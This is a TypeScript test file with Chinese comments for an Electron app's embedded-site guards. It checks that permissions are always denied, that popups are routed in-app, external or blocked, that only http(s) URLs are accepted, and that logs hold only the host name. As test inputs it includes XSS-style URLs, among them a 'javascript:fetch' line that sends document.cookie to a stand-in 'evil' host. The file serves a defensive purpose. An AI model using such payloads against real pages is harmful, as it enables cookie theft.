/**
 * 内嵌站点的权限与弹窗闸门（纯函数 + 接线，不需要 Electron）
 *
 * 这一项没有「跑一遍看看」的轻量验证通道：装 handler 要在 Electron 里才生效，
 * 而「该不该放」的判断错一次就是静默的 —— 站点拿到麦克风不会有任何提示。
 * 所以能钉死的两层都钉：
 * - 纯函数层：URL 协议判定、三档弹窗归属、日志不得漏出整条 URL；
 * - 接线层：三道 handler 确实装在 web-contents-created 上、确实恒拒、
 *   确实登记了唯一的例外（登录窗口），且注册早于第一枚窗口。
 *
 * 运行：npm run test:webview-guards
 */

import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import {
  denyNote,
  isHttpUrl,
  isLoginWindow,
  markLoginWindow,
  popupDisposition,
  popupNote,
  releaseLoginWindow,
  safeHost,
} from '../src/main/webview/guards'

const ROOT = path.resolve(__dirname, '..')

let pass = 0
let fail = 0

async function it(name: string, fn: () => Promise<void> | void): Promise<void> {
  try {
    await fn()
    pass++
    console.log(`  [PASS] ${name}`)
  } catch (e) {
    fail++
    console.log(`  [FAIL] ${name}`)
    console.log(`         ${(e as Error).message.split('\n').slice(0, 4).join('\n         ')}`)
  }
}

function readSrc(rel: string): string {
  return fs.readFileSync(path.join(ROOT, rel), 'utf8')
}

async function main(): Promise<void> {
  console.log('='.repeat(46))
  console.log('  内嵌站点闸门：权限一律拒、弹窗不失控')
  console.log('='.repeat(46))

  await it('协议判定：只认 http(s)，解析不了的按不可信处理', () => {
    assert.equal(isHttpUrl('http://chatgpt.com/a'), true)
    assert.equal(isHttpUrl('https://deepseek.com'), true)
    assert.equal(isHttpUrl('HTTPS://BigModel.cn/x'), true, '协议大小写不该成为绕路')
    for (const bad of [
      'javascript:alert(1)',
      'data:text/html,<script>steal()</script>',
      'blob:https://x/8f0e',
      'file:///C:/Users/you/Desktop/x.html',
      'about:blank',
      '//evil.com/phish',
      '',
      '不是 URL',
    ]) {
      assert.equal(isHttpUrl(bad), false, `${bad} 不该被当成可打开的链接`)
    }
  })

  await it('弹窗分档：登录窗口放行到应用内，其余站点一律不占应用窗口', () => {
    const url = 'https://accounts.google.com/o/oauth2/auth'
    assert.equal(popupDisposition(url, { loginWindow: true }), 'in-app', 'OAuth 靠弹窗续接，一刀切就登不进去')
    assert.equal(popupDisposition(url, { loginWindow: false }), 'external', '聊天页里的链接不该长出第二枚 Torra 窗口')
  })

  await it('弹窗分档：非 http(s) 连系统浏览器都不给，且与是否登录窗口无关', () => {
    const poison = 'javascript:fetch("http://evil/"+document.cookie)'
    assert.equal(popupDisposition(poison, { loginWindow: false }), 'block')
    assert.equal(popupDisposition(poison, { loginWindow: true }), 'block', '登录窗口也不是免检牌')
    assert.equal(popupDisposition('', { loginWindow: true }), 'block')
  })

  await it('登录窗口例外是登记制的：没登记、已释放都不算', () => {
    assert.equal(isLoginWindow(4242), false, '没人登记的 id 不能默认放行')
    markLoginWindow(4242)
    assert.equal(isLoginWindow(4242), true)
    releaseLoginWindow(4242)
    assert.equal(isLoginWindow(4242), false, '窗口关了就该撤，例外不累积')
  })

  await it('日志只落主机名：整条 URL 不进诊断（那里面常带一次性 token）', () => {
    const src = 'https://chatgpt.com/c/1234?access_token=SECRET#frag'
    assert.equal(safeHost(src), 'chatgpt.com')
    assert.doesNotMatch(safeHost('不完整的'), /./, '解析不了就空串，别把原文抄进日志')
    const note = denyNote('media', src)
    assert.match(note, /^media 已拒绝/, '要看得见是哪个权限被拒')
    assert.match(note, /chatgpt\.com/)
    assert.doesNotMatch(note, /SECRET|access_token|1234/, '拒绝原因不能顺手把凭据写进日志')
  })

  await it('拒绝口径要说人话：写明是闸门拒的，不是站点坏了', () => {
    const note = denyNote('notifications', 'https://www.doubao.com/chat')
    assert.match(note, /不给内嵌站点任何权限/, '用户/体检读到这句就知道是被设计挡住的')
    assert.match(note, /doubao\.com/)
    assert.match(denyNote('geolocation', ''), /来源 未知页面/, '拿不到来源时也要有个明确说法')
  })

  await it('弹窗留痕：三档各有明确措辞，挡住的东西看得见', () => {
    assert.match(popupNote('in-app', 'https://auth.x.com/o', 'https://yuanbao.taobao.com/login'), /放行到应用内/)
    assert.match(popupNote('external', 'https://ref.example/a', 'https://chatgpt.com/c/1'), /交系统浏览器/)
    assert.match(popupNote('block', 'javascript:alert(1)', 'https://chatgpt.com/c/1'), /整体挡掉/)
    assert.match(popupNote('external', 'https://ref.example/a', ''), /应用页面/, '来源未知也要说清是谁发起的')
  })

  await it('接线：三道闸门装在 web-contents-created 上，每个 webContents 都过一遍', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)
    assert.ok(body, '找不到 hardenEmbeddedContents 的实现')
    const impl = body[1] ?? ''
    assert.match(impl, /setPermissionCheckHandler\(\(\) => false\)/, '同步的权限自检也要拒，否则站点能先问后动')
    assert.match(impl, /setPermissionRequestHandler/, '不装就是「自动批准一切权限请求」')
    assert.match(impl, /ses\.setPermissionCheckHandler/, '权限 handler 挂在 session 上，挂 webContents 是静默失效')
    assert.match(impl, /hardened\.has\(ses\)/, '同一分区重复注册会顶掉前一个闭包，来源就串了')
    assert.match(impl, /callback\(false\)/)
    assert.doesNotMatch(impl, /callback\(true\)/, '没有第二档：不给任何按权限名放行的口子')
    assert.match(impl, /setWindowOpenHandler/, '默认行为是在应用内开子窗，且复用同一 persist: 分区')
    assert.match(impl, /return \{ action: 'deny' \}/)
    assert.match(impl, /shell\.openExternal\(url\)/)
    assert.match(main, /app\.on\('web-contents-created'/)
    assert.match(main, /from '.\/webview\/guards'/)
  })

  await it('接线：闸门登记必须早于 whenReady，否则第一枚窗口带不上', () => {
    const main = readSrc('src/main/index.ts')
    const callAt = main.search(/^hardenEmbeddedContents\(\)$/m)
    const readyAt = main.indexOf('app.whenReady()')
    assert.ok(callAt > 0, '模块顶层要有一次调用，光有定义不生效')
    assert.ok(readyAt > callAt, `登记(${callAt})必须早于建窗(${readyAt})`)
  })

  await it('接线：只有登录窗口被登记为例外，关闭即撤销', () => {
    const pool = readSrc('src/main/webview/pool.ts')
    assert.match(pool, /const loginContentsId = login\.webContents\.id/, 'id 要在窗口还在时取')
    assert.match(pool, /markLoginWindow\(loginContentsId\)/)
    assert.match(pool, /login\.once\('closed', \(\) => releaseLoginWindow\(loginContentsId\)\)/, '不能留着一串失效 id')
    assert.match(pool, /import \{ markLoginWindow, releaseLoginWindow \} from '.\/guards'/)
    assert.doesNotMatch(pool, /markLoginWindow\(login\.webContents\.id\)/, '放进 closed 回调就读不到 id 了')
  })

  await it('用例本身挂在 npm test 链上，不是一跑而过就没人看的孤儿', () => {
    const pkg = JSON.parse(readSrc('package.json')) as { scripts: Record<string, string> }
    assert.equal(pkg.scripts['test:webview-guards'].includes('scripts/test-webview-guards.ts'), true)
    assert.match(pkg.scripts.test, /test:webview-guards/, 'npm test 必须跑到这一套')
  })

  console.log('-'.repeat(46))
  console.log(`  通过 ${pass} · 失败 ${fail}`)
  console.log('='.repeat(46))
  if (fail > 0) process.exit(1)
}

void main()
